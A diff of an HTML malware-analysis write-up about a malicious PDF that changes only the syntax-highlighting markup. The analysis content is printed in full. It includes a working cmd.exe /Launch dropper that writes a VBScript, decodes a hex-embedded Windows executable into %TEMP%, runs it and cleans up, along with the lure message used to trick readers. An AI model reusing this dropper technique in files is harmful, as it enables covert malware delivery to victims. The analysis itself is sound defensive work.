@@ -944,9 +944,9 @@
     </span>
     
 </h3>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln">1</span><span class="cl"><span class="gp">$</span> file *
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="go">evil.pdf: PDF document, version 1.5
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>$ file *
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>evil.pdf: PDF document, version 1.5
+</span></span></code></pre></div></div>
 
 <h3 class="relative group"><span style="color:red">Static Analysis</span>
     <div id="static-analysis" class="anchor"></div>
@@ -958,31 +958,31 @@
     
 </h3>
 <p><code>pdfid</code> showed no JavaScript but confirmed <code>/OpenAction</code> and <code>/Launch</code>:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln">1</span><span class="cl"><span class="gp">$</span> pdfid evil.pdf
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="go">PDFiD 0.2.10 evil.pdf
-</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="go"> /JS                    0
-</span></span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="go"> /JavaScript            0
-</span></span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="go"> /OpenAction            1(1)
-</span></span></span><span class="line"><span class="ln">6</span><span class="cl"><span class="go"> /Launch                1(1)
-</span></span></span><span class="line"><span class="ln">7</span><span class="cl"><span class="go"> /EmbeddedFile          0
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>$ pdfid evil.pdf
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>PDFiD 0.2.10 evil.pdf
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span> /JS                    0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span> /JavaScript            0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5</span><span> /OpenAction            1(1)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6</span><span> /Launch                1(1)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7</span><span> /EmbeddedFile          0
+</span></span></code></pre></div></div>
 <p>Unlike the previous sample, there is no JavaScript and no embedded file object — the payload is hidden in plain sight inside the PDF body itself.</p>
 <p><code>pdf-parser</code> revealed the <code>Launch</code> action in obj 5:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln"> 1</span><span class="cl"><span class="gp">$</span> pdf-parser evil.pdf
-</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="go">obj 5 0
-</span></span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="go"> Type: /Action
-</span></span></span><span class="line"><span class="ln"> 4</span><span class="cl"><span class="go"> /S /Launch
-</span></span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="go"> /F (cmd.exe)
-</span></span></span><span class="line"><span class="ln"> 6</span><span class="cl"><span class="go"> /P (/C echo Set o=CreateObject^(&#34;Scripting.FileSystemObject&#34;^):
-</span></span></span><span class="line"><span class="ln"> 7</span><span class="cl"><span class="go">     Set f=o.OpenTextFile^(&#34;evil.pdf&#34;,1,True^):
-</span></span></span><span class="line"><span class="ln"> 8</span><span class="cl"><span class="go">     f.SkipLine:
-</span></span></span><span class="line"><span class="ln"> 9</span><span class="cl"><span class="go">     Set w=CreateObject^(&#34;WScript.Shell&#34;^):
-</span></span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="go">     Set g=o.OpenTextFile^(w.ExpandEnvironmentStrings^(&#34;%TEMP%&#34;^)+&#34;\\msf.exe&#34;,2,True^):
-</span></span></span><span class="line"><span class="ln">11</span><span class="cl"><span class="go">     a=Split^(Trim^(Replace^(f.ReadLine,&#34;\\x&#34;,&#34; &#34;^)^)^):
-</span></span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="go">     for each x in a:g.Write^(Chr^(&#34;&amp;h&#34; ^&amp; x^)^):next:
-</span></span></span><span class="line"><span class="ln">13</span><span class="cl"><span class="go">     g.Close:f.Close &gt; 1.vbs &amp;&amp; cscript //B 1.vbs &amp;&amp;
-</span></span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="go">     start %TEMP%\\msf.exe &amp;&amp; del /F 1.vbs)
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span>$ pdf-parser evil.pdf
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span>obj 5 0
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span> Type: /Action
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span><span> /S /Launch
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span> /F (cmd.exe)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span><span> /P (/C echo Set o=CreateObject^(&#34;Scripting.FileSystemObject&#34;^):
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span><span>     Set f=o.OpenTextFile^(&#34;evil.pdf&#34;,1,True^):
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span><span>     f.SkipLine:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span><span>     Set w=CreateObject^(&#34;WScript.Shell&#34;^):
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span>     Set g=o.OpenTextFile^(w.ExpandEnvironmentStrings^(&#34;%TEMP%&#34;^)+&#34;\\msf.exe&#34;,2,True^):
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span>     a=Split^(Trim^(Replace^(f.ReadLine,&#34;\\x&#34;,&#34; &#34;^)^)^):
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span>     for each x in a:g.Write^(Chr^(&#34;&amp;h&#34; ^&amp; x^)^):next:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span>     g.Close:f.Close &gt; 1.vbs &amp;&amp; cscript //B 1.vbs &amp;&amp;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span>     start %TEMP%\\msf.exe &amp;&amp; del /F 1.vbs)
+</span></span></code></pre></div></div>
 <p>The command does the following:</p>
 <ol>
 <li>Writes an inline VBScript to <code>1.vbs</code></li>
@@ -992,17 +992,17 @@
 </ol>
 <p>The social engineering message <code>&quot;To view the encrypted content please tick the Do not show this message again box and press Open&quot;</code> is appended to trick the user into clicking Open, which triggers the <code>Launch</code> action.</p>
 <p>Inspecting the PDF body confirmed the hex-encoded payload on the second line:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln">1</span><span class="cl"><span class="gp">$</span> cat evil.pdf
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="gp">%</span>PDF-1.5
-</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="go">\x4d\x5a\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00...
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>$ cat evil.pdf
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span>%PDF-1.5
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>\x4d\x5a\x90\x00\x03\x00\x00\x00\x04\x00\x00\x00\xff\xff\x00\x00\xb8\x00...
+</span></span></code></pre></div></div>
 <p><code>\x4d\x5a</code> = <code>MZ</code> — PE32 magic bytes, confirming an executable is embedded directly in the PDF body.</p>
 <p>The payload was extracted with:</p>
-<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="ln">1</span><span class="cl"><span class="gp">$</span> grep -oP <span class="s1">&#39;\\x\K[0-9a-fA-F]{2}&#39;</span> evil.pdf <span class="p">|</span> xxd -r -p &gt; mw.bin
-</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="err">
-</span></span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="gp">$</span> file mw.bin
-</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="go">mw.bin: PE32 executable for MS Windows 4.00 (GUI), Intel i386, 5 sections
-</span></span></span></code></pre></div></div>
+<div class="highlight-wrapper"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span><span>$ grep -oP <span style="color:#e6db74">&#39;\\x\K[0-9a-fA-F]{2}&#39;</span> evil.pdf | xxd -r -p &gt; mw.bin
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span><span><span style="color:#960050;background-color:#1e0010">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span><span>$ file mw.bin
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4</span><span>mw.bin: PE32 executable for MS Windows 4.00 (GUI), Intel i386, 5 sections
+</span></span></code></pre></div></div>
 
 <h3 class="relative group"><span style="color:red">Dynamic Analysis</span>
     <div id="dynamic-analysis" class="anchor"></div>
